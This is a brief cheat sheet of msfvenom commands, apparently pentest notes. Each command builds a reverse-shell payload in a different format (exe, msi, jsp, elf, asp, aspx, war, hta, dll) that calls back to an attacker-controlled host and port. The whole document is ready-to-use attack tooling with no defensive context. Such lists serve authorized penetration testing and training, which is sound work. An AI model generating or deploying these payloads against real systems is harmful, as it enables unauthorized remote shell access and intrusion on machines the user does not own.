# MSFVenom
------

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

exe
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=9999 -f exe -o shell.exe
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.23.31 LPORT=9999 -f exe -o shell.exe  
```

msi
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.121 LPORT=80 -f msi -o rev.msi
```

jsp
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=9999 -f raw -o shell.jsp
```

elf (Wordpress Plugin)
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.133 LPORT=9999 -f elf -o shell.elf
```

asp
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=9999 -f asp -o shell.asp
```

aspx
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=$1 LPORT=9999 -f aspx -o shell.aspx
```

war
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=9999 -f war -o shell.war
```

hta-psh
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=9999 -f hta-psh -o shell.hta
```

dll
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=9999 -f dll -o shell.dll
```
